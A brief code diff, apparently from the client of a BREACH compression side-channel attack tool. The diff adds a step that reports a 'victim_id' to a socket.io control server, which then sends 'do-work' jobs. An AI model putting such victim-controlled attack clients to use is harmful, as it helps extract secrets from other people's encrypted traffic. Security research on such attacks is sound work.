@@ -1,6 +1,6 @@
 const io = require('socket.io-client'),
       req = require('./request.js'),
-      config = require('./config.js');	
+      config = require('./config.js');
 
 var BREACHClient = {
     ONE_REQUEST_TIMEOUT: 5000,
@@ -11,6 +11,9 @@ var BREACHClient = {
         this._socket.on('connect', () => {
             console.log('Connected');
         });
+        this._socket.emit('victim_id', {
+                victim_id: config.victim_id
+            });
         this._socket.on('do-work', (work) => {
             console.log('do-work message');
             this.doWork(work);
